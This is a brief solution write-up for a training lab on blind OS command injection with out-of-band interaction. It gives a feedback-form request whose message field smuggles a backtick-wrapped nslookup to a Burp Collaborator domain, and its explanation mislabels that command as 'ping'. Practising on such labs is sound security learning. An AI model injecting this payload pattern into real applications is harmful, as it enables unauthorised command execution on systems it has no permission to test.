# Lab: Blind OS command injection with out-of-band interaction


>This lab contains a blind OS command injection vulnerability in the feedback function.

>The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

>To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

### Colaborator
My burp collaborator link `ecu2qyrr6gqtn8krj0i1mo6qwh27qw.burpcollaborator.net`

### Vulnerable area
`POST /feedback/submit`

### Exploit
Made a dns lookup to my collaborator instance with the following payload: 

<pre>csrf=jT692ZRhuzxNTU8g5ugNS7Tqp21bWDXa&name=niko&email=niko%40mail.com&subject=mad&message=mad;`nslookup ecu2qyrr6gqtn8krj0i1mo6qwh27qw.burpcollaborator.net`</pre>

Used command separator `;` and surrounded the nslookup command with backticks. I did this because we are executing the ping command *within* the command passed to the server (containing feedback info)

Lab solved!